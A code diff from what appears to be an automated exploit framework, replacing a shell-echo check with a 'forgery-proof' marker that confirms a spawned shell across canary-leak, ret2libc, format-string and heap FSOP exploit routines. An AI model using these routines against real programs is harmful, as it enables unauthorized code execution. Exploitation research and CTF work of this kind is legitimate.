@@ -1062,7 +1062,10 @@ def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_t
     import re as _re
     import struct as _struct
 
-    from . import rop
+    from . import attribution, rop
+    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
+    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
+    markers = attribution.make_code_markers()
     rx = _re.compile(canary_regex.encode("latin-1"))
     q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
     feed = canary_trigger if loop_feed is None else loop_feed
@@ -1128,12 +1131,12 @@ def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_t
                     p.stdin.write(bytes(s2))
                     p.stdin.flush()
                     time.sleep(0.3)
-                    p.stdin.write(b"echo " + marker + b"\n")
+                    p.stdin.write(markers.command + b"\n")
                     p.stdin.flush()
                 except (BrokenPipeError, OSError):
                     break                                       # wrong parity
                 out = _read_until(p, time.time() + timeout, quiet=1.5)
-                if marker in out and (b"echo " + marker) not in out:
+                if markers.proves(out):
                     return {"ok": True, "canary": canary, "base": base,
                             "system": base + system_off, "align": align,
                             "output": out[:400].decode("latin-1", "ignore")}
@@ -1242,11 +1245,14 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
     (>=2 corroborating image pointers via `exploit.recover_pie_base`) and the win is `win_off +
     pie_base`. `pie=False` (no-PIE): the image is at a fixed address, so NO base leak is needed --
     `win_off` is the absolute win address and only the canary is leaked. Confirmed by a spawned
-    shell echoing `marker`, or the win's own output containing it. Returns {ok, canary, pie_base,
+    shell EVALUATING the forgery-proof `attribution` marker (an echo cannot satisfy it). Returns {ok, canary, pie_base,
     win} or {ok: False, reason}."""
     import struct as _struct
 
-    from . import rop
+    from . import attribution, rop
+    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
+    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
+    markers = attribution.make_code_markers()
     q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
@@ -1312,12 +1318,12 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                     time.sleep(0.2)
                     if loop_feed:
                         p.stdin.write(loop_feed)      # satisfy the loop's own read first
-                    p.stdin.write(b"echo " + marker + b"\n")
+                    p.stdin.write(markers.command + b"\n")
                     p.stdin.flush()
                 except (BrokenPipeError, OSError):
                     continue
                 out = _read_until(p, time.time() + timeout, quiet=1.2)
-                if marker in out and (b"echo " + marker) not in out:
+                if markers.proves(out):
                     return {"ok": True, "canary": canary, "pie_base": (pie_base if pie else None),
                             "win": base + int(win_off),
                             "output": out[:400].decode("latin-1", "ignore")}
@@ -1362,8 +1368,9 @@ def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read
       write -- fmtstr_payload plants `pie_base + win_off` at a candidate (stack_ptr + delta).
     The exact frame-pointer->return delta is layout-specific, so SWEEP the leaked stack pointers x a
     few deltas and let a spawned-shell marker pick the slot that actually redirects (never guessed
-    blindly). Confirmed by a shell echoing `marker`. Returns {ok, pie_base, win, target} or
-    {ok: False, reason}. `gate_prefix` is any bytes that must precede the payload to reach the sink.
+    blindly). Confirmed by a shell EVALUATING the forgery-proof `attribution` marker. Returns
+    {ok, pie_base, win, target} or {ok: False, reason}. `gate_prefix` is any bytes that must
+    precede the payload to reach the sink.
 
     The probe must FIT the sink's read size (`read_cap`): too long a `%p` dump spills past the read
     and desyncs the loop. A big input buffer also pushes the saved frame off the low slots, so the
@@ -1372,8 +1379,12 @@ def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read
     varargs) is calibrated once in a throwaway process -- it is an ASLR-invariant layout constant."""
     import re as _re
 
+    from . import attribution
     from . import exploit as _exploit
     from . import fmt as _fmt
+    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
+    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
+    markers = attribution.make_code_markers()
     rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
@@ -1470,12 +1481,12 @@ def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read
                         p.stdin.write(loop_exit)
                         p.stdin.flush()
                         time.sleep(0.2)
-                    p.stdin.write(b"echo " + marker + b"\n")   # a spawned shell evaluates this
+                    p.stdin.write(markers.command + b"\n")   # a spawned shell evaluates this
                     p.stdin.flush()
                 except (BrokenPipeError, OSError):
                     continue
                 out = _read_until(p, time.time() + timeout, quiet=1.2)
-                if marker in out and (b"echo " + marker) not in out:
+                if markers.proves(out):
                     return {"ok": True, "pie_base": pie_base, "win": win, "target": target,
                             "fmt_offset": int(fmt_offset),
                             "output": out[:400].decode("latin-1", "ignore")}
@@ -1517,13 +1528,17 @@ def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, s
                    canary-prefixed overflow calls system.
 
     All *_off are IMAGE offsets (relocated by the recovered PIE base) EXCEPT system_off / binsh_off /
-    puts_libc_off, which are offsets in the loading libc. Confirmed by a spawned shell that echoes
-    `marker`. Returns {ok, route, canary, pie_base, libc_base, system} or {ok: False, reason}."""
+    puts_libc_off, which are offsets in the loading libc. Confirmed by a spawned shell that
+    EVALUATES the forgery-proof `attribution` marker. Returns {ok, route, canary, pie_base,
+    libc_base, system} or {ok: False, reason}."""
     import selectors as _selectors
     import struct as _struct
 
     from ..fuzz import menu as _menu
-    from . import rop
+    from . import attribution, rop
+    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
+    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
+    markers = attribution.make_code_markers()
     q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
@@ -1540,7 +1555,7 @@ def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, s
     def _shell_out(p, sel):
         try:
             time.sleep(0.2)
-            p.stdin.write(b"echo " + marker + b"\n")
+            p.stdin.write(markers.command + b"\n")
             p.stdin.flush()
         except (BrokenPipeError, OSError):
             return b""
@@ -1581,7 +1596,7 @@ def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, s
                     except (BrokenPipeError, OSError):
                         continue
                     out = _shell_out(p, sel)
-                    if marker in out and (b"echo " + marker) not in out:
+                    if markers.proves(out):
                         return {"ok": True, "route": "one-shot", "canary": canary, "pie_base": pie_base,
                                 "libc_base": libc_base, "system": libc_base + system_off,
                                 "output": out[:400].decode("latin-1", "ignore")}
@@ -1635,7 +1650,7 @@ def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, s
                 except (BrokenPipeError, OSError):
                     continue
                 out = _shell_out(p, sel)
-                if marker in out and (b"echo " + marker) not in out:
+                if markers.proves(out):
                     return {"ok": True, "route": "two-stage", "canary": canary, "pie_base": pie_base,
                             "libc_base": libc2, "system": libc2 + system_off,
                             "output": out[:400].decode("latin-1", "ignore")}
@@ -1767,7 +1782,7 @@ def _le_canary_words(data: bytes, cap: int = 64) -> list:
 _SEQ_DUMP_RE = re.compile(rb"0x[0-9a-fA-F]+|\(nil\)")
 
 
-def canary_slot_in_dump(dump: bytes, canary: int, trigger: bytes = b"") -> Optional[int]:
+def canary_slot_in_dump(dump: bytes, canary: int, trigger: bytes = b"") -> int | None:
     """The 1-based positional `%N$` slot the stack canary printed at, from a SEQUENTIAL `%p` dump.
 
     A sequential `%p.%p.%p...` sink prints vararg 1, 2, 3, ... in order, so the canary's index among
@@ -2324,12 +2339,16 @@ def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_da
 
     The four ops are supplied as callables that render the target's own menu input:
     `add(idx,size,data)->bytes`, `free(idx)->bytes`, `view(idx)->bytes`, `edit(idx,data)->bytes`;
-    `exit_seq` triggers a flush. Confirmed by a spawned shell echoing `marker`. Returns
+    `exit_seq` triggers a flush. Confirmed by a spawned shell EVALUATING the forgery-proof
+    `attribution` marker. Returns
     {ok, libc_base, heap_page, ...}."""
     import struct as _struct
 
+    from . import attribution, rop
     from . import heap as _heap
-    from . import rop
+    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
+    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
+    markers = attribution.make_code_markers()
     T = _heap.house_of_apple2_targets(libc_data)
     if not T:
         return {"ok": False, "reason": "libc lacks _IO_2_1_stdout_/_IO_wfile_jumps/system"}
@@ -2550,12 +2569,12 @@ def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_da
             # newline (that is what the target's read(fd,buf,W) expects), so without this the spawned
             # shell's first line is "5<pad>echo <marker>" -- the marker becomes an argument to a bogus
             # command and never echoes, failing the confirmation on an exploit that actually worked.
-            p.stdin.write(b"\necho " + marker + b"\n")
+            p.stdin.write(b"\n" + markers.command + b"\n")
             p.stdin.flush()
         except (BrokenPipeError, OSError):
             return {"ok": False, "reason": "crashed before the shell", "libc_base": base}
         out = _read_until(p, time.time() + timeout, quiet=1.5)
-        if marker in out and (b"echo " + marker) not in out:
+        if markers.proves(out):
             return {"ok": True, "libc_base": base, "heap_page": heap_page, "slots": used,
                     "stdout": stdout_addr, "poison_size": poison_size,
                     "wide_addr": wide_addr or None,
@@ -2741,10 +2760,14 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
     `write_cell(addr, value) -> bytes` and `read_cell(addr) -> bytes` render the target's own input
     for one write / one read; `leak_slots` is [(got_address, libc_symbol_name)] in try order;
     `scratch` is a writable address whose +0x68 may be used for the fake wide jump table (the
-    target's own global array). Confirmed by a shell echoing `marker`. Returns
+    target's own global array). Confirmed by a shell EVALUATING the forgery-proof `attribution`
+    marker. Returns
     {ok, plan, plans_tried, libc_base, fp, cells, reason}."""
+    from . import attribution, rop
     from . import heap as _heap
-    from . import rop
+    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
+    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
+    markers = attribution.make_code_markers()
     syms = rop.libc_symbols(libc_data, tuple({n for _a, n in leak_slots}))
     usable = [(a, n) for a, n in leak_slots if n in syms]
     if not usable:
@@ -2839,8 +2862,8 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
                                           "write primitive does not reach the stack"}
                 for seq in (tuple(exit_seqs) or (b"",)):
                     out = _op(seq, 0.6) if seq else b""
-                    out += _op(b"echo " + marker + b"\n", 1.2)
-                    if marker in out and (b"echo " + marker) not in out:
+                    out += _op(markers.command + b"\n", 1.2)
+                    if markers.proves(out):
                         return {"ok": True, "libc_base": base, "fp": slot, "cells": shown,
                                 "fp_name": "main's saved return address",
                                 "exit_seq": seq, "finish": "system", "align": align,
@@ -2878,8 +2901,8 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
                                           "write primitive does not reach that address"}
                 for seq in (tuple(exit_seqs) or (b"",)):
                     out = _op(seq, 0.6) if seq else b""
-                    out += _op(b"echo " + marker + b"\n", 1.2)
-                    if marker in out and (b"echo " + marker) not in out:
+                    out += _op(markers.command + b"\n", 1.2)
+                    if markers.proves(out):
                         return {"ok": True, "libc_base": base, "fp": scratch, "cells": shown,
                                 "fp_name": "a FILE of our own in the target's array",
                                 "exit_seq": seq, "finish": T["plan"],
@@ -2924,8 +2947,8 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
                                       "primitive does not reach that address"}
             for seq in (tuple(exit_seqs) or (b"",)):
                 out = _op(seq, 0.6) if seq else b""
-                out += _op(b"echo " + marker + b"\n", 1.2)
-                if marker in out and (b"echo " + marker) not in out:
+                out += _op(markers.command + b"\n", 1.2)
+                if markers.proves(out):
                     return {"ok": True, "libc_base": base, "fp": fp, "wide_data": wide,
                             "cells": shown, "fp_name": T["fp_name"], "exit_seq": seq,
                             "targets": {k: v for k, v in T.items() if k != "fp_name"}}
